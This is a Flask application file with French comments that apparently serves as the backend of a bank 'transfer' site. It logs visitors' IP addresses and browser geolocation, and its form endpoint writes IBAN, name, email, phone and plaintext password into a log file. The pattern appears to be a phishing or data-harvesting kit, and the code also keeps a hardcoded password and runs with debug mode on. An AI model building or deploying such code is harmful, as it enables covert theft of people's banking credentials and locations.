#/app.py
from flask import Flask, render_template, request, jsonify
import os
import datetime
import ipaddress
import json
from config import LOGS_DIR

app = Flask(__name__)

# Assurer que le répertoire de logs existe
os.makedirs(LOGS_DIR, exist_ok=True)
log_file = os.path.join(LOGS_DIR, 'user_data.txt')

def get_client_ip():
    """Récupérer l'adresse IP réelle du client, même derrière un proxy"""
    if request.headers.get('X-Forwarded-For'):
        client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        client_ip = request.headers.get('X-Real-IP')
    else:
        client_ip = request.remote_addr
    return client_ip

def log_user_data(ip, coords=None, geoloc=None, action=None):
    """Enregistrer les données de l'utilisateur dans le fichier log"""
    now = datetime.datetime.now()
    date = now.strftime("%Y-%m-%d")
    time = now.strftime("%H:%M:%S")
    
    # Formater les coordonnées et la géolocalisation si disponibles
    coords_str = f"{coords}" if coords else "Non disponible"
    geoloc_str = f"{geoloc}" if geoloc else "Non disponible"
    action_str = f", action: {action}" if action else ""
    
    log_entry = f"{date}, {time}, {ip}, {coords_str}, {geoloc_str}{action_str}\n"
    
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    return True

@app.route('/')
def index():
    """Page d'accueil"""
    # Enregistrer l'accès à la page d'accueil
    ip = get_client_ip()
    log_user_data(ip)
    return render_template('index.html')

@app.route('/transfer')
def transfer():
    """Page de transfert"""
    # Enregistrer l'accès à la page de transfert
    ip = get_client_ip()
    log_user_data(ip, action="accès page transfert")
    return render_template('transfer.html')

@app.route('/log_location', methods=['POST'])
def log_location():
    """Endpoint pour enregistrer la localisation de l'utilisateur"""
    data = request.json
    ip = get_client_ip()
    
    # Extraire les coordonnées et les informations de géolocalisation
    coords = data.get('coords')
    geoloc = data.get('geoloc')
    action = data.get('action', 'géolocalisation')
    
    # Enregistrer dans le fichier de log
    log_user_data(ip, coords, geoloc, action)
    
    return jsonify({"status": "success"})

@app.route('/submit_form', methods=['POST'])
def submit_form():
    """Endpoint pour traiter les données du formulaire"""
    data = request.json
    ip = get_client_ip()
    
    # Enregistrer les informations bancaires
    log_entry = {
        'ip': ip,
        'date': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'iban': data.get('iban'),
        'nom': data.get('nom'),
        'prenom': data.get('prenom'),
        'email': data.get('email'),
        'telephone': data.get('telephone'),
        'password': data.get('password')  # Enregistrement du mot de passe pour vérification
    }
    
    # Vérifier que le mot de passe fourni est correct
    correct_password = "6769832548566125"
    if data.get('password') != correct_password:
        return jsonify({"status": "error", "message": "Invalid password"}), 401
    
    # Enregistrer dans le fichier de log avec une indication que c'est un formulaire
    log_user_data(ip, action=f"form submission: {json.dumps(log_entry)}")
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(debug=True)